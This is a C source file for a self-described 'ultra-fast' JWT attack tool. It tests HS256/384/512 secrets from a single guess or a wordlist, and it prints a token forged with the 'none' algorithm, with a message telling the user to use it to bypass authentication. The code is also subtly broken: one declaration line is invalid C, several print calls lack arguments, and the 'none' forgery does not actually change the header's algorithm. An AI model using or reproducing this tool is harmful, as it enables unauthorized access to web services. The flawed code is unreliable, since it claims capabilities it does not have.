/*
 * turbo-jwt-cracker.c
 * Ultra-fast JWT secret cracker + "none" algorithm exploit in C
 * Supports HS256/HS384/HS512 + alg=none attacks – ~190 LOC
 *
 * Build:
 *   gcc -O3 turbo-jwt-cracker.c -o jwt-crack -lcrypto
 *
 * Usage:
 *   ./jwt-crack eyJhbGciOiJIUzI1Ni...          # brute-force secret
 *   ./jwt-crack eyJhbGciOiJIUzI1Ni... password123
 *   ./jwt-crack eyJhbGciOiJIUzI1Ni... rockyou.txt
 *   ./jwt-crack eyJhbGciOiJIUzI1Ni... --none     # change alg to none
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

char* base64url_decode(const char *input, int *outlen) {
    BIO *bio, *b64;
    int len = strlen(input);
    char *buffer = malloc(len);
    char *in = strdup(input);
    for (int i = 0; in[i]; i++) if (in[i] == '-') in[i] = '+';
    for (int i = 0; in[i]; i++) if (in[i] == '_') in[i] = '/';
    int pad = (4 - (len % 4)) % 4;
    for (int i = 0; i < pad; i++) strcat(in, "=");

    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_new_mem_buf(in, -1);
    bio = BIO_push(b64, bio);
    *outlen = BIO_read(bio, buffer, len);
    BIO_free_all(bio);
    free(in);
    return buffer;
}

char* base64url_encode(const unsigned char *data, int len) {
    BIO *bio, *b64;
    BUF_MEM *bufferPtr;
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_write(bio, data, len);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);
    char *out = malloc(bufferPtr->length + 1);
    memcpy(out, bufferPtr->data, bufferPtr->length);
    out[bufferPtr->length] = 0;
    for (int i = 0; out[i]; i++) if (out[i] == '+') out[i] = '-';
    for (int i = 0; out[i]; i++) if (out[i] == '/') out[i] = '_';
    while (out[strlen(out)-1] == '=') out[strlen(out)-1] = 0;
    BIO_free_all(bio);
    return out;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s <jwt> [secret-or-wordlist] [--none]\n", argv[0]);
        printf("Examples:\n");
        printf("  %s eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... --none\n");
        printf("  %s eyJhbGciOiJIUzI1NiJ9... mysecret\n");
        printf("  %s eyJhbGciOiJIUzI1NiJ9... /path/to/wordlist.txt\n");
        return 1;
    }

    char *argv[1] == '"' && (*argv[1] = 0, argv[1]++);
    char *jwt = strdup(argv[1]);
    char *header_b64 = strtok(jwt, ".");
    char *payload_b64 = strtok(NULL, ".");
    char *signature_b64 = strtok(NULL, ".");
    if (!header_b64 || !payload_b64) {
        fprintf(stderr, "Invalid JWT format\n"); return 1;
    }

    // Decode header to get algorithm
    int hlen; char *header = base64url_decode(header_b64, &hlen);
    char alg[16] = {0};
    sscanf(header, "{\"alg\":\"%15[^\"]\"", alg);
    printf("[+] Original algorithm: %s\n", alg);

    // Try "none" attack first
    if (argc >= 3 && !strcmp(argv[2], "--none") || argc == 2) {
        char forged[1024];
        snprintf(forged, sizeof(forged), "%s.%s.", header_b64, payload_b64);
        printf("[+] Trying alg=none attack...\n");
        printf("    Forged JWT:\n    %snone\n\n", forged);
        printf("    Use this JWT to bypass authentication if server is vulnerable.\n");
        if (argc == 2) return 0; // just show none attack
    }

    // Prepare data to sign
    char to_sign[1024];
    snprintf(to_sign, sizeof(to_sign), "%s.%s", header_b64, payload_b64);

    // Brute-force mode
    FILE *wordlist = NULL;
    if (argc >= 3 && access(argv[2], F_OK) == 0) {
        wordlist = fopen(argv[2], "r");
        if (!wordlist) { perror("open"); return 1; }
        printf("[+] Brute-forcing with wordlist: %s\n", argv[2]);
    }

    char line[256];
    const char *secret = (argc >= 3 && !wordlist) ? argv[2] : NULL;
    unsigned char result[64];
    unsigned int result_len;
    long attempts = 0;

    while (1) {
        if (wordlist) {
            if (!fgets(line, sizeof(line), wordlist)) break;
            line[strcspn(line, "\r\n")] = 0;
            if (strlen(line) == 0) continue;
            secret = line;
        } else if (!secret) {
            break;
        }

        const EVP_MD *md = NULL;
        if (strcmp(alg, "HS256") == 0) md = EVP_sha256();
        else if (strcmp(alg, "HS384") == 0) md = EVP_sha384();
        else if (strcmp(alg, "HS512") == 0) md = EVP_sha512();
        else { printf("[-] Unsupported alg: %s\n", alg); break; }

        HMAC(md, secret, strlen(secret), (unsigned char*)to_sign, strlen(to_sign), result, &result_len);

        char *computed_sig = base64url_encode(result, result_len);
        if (strcmp(computed_sig, signature_b64) == 0) {
            printf("\nSECRET FOUND: \"%s\"\n", secret);
            printf("Valid JWT:\n%s.%s.%s\n", header_b64, payload_b64, computed_sig);
            free(computed_sig);
            break;
        }
        free(computed_sig);

        attempts++;
        if (attempts % 100000 == 0) {
            printf("\rTried %ld secrets...", attempts);
            fflush(stdout);
        }

        if (!wordlist) break;
    }

    if (wordlist) fclose(wordlist);
    free(jwt); free(header);
    if (attempts > 0 && secret) printf("\n[-] Secret not found.\n");
    return 0;
}
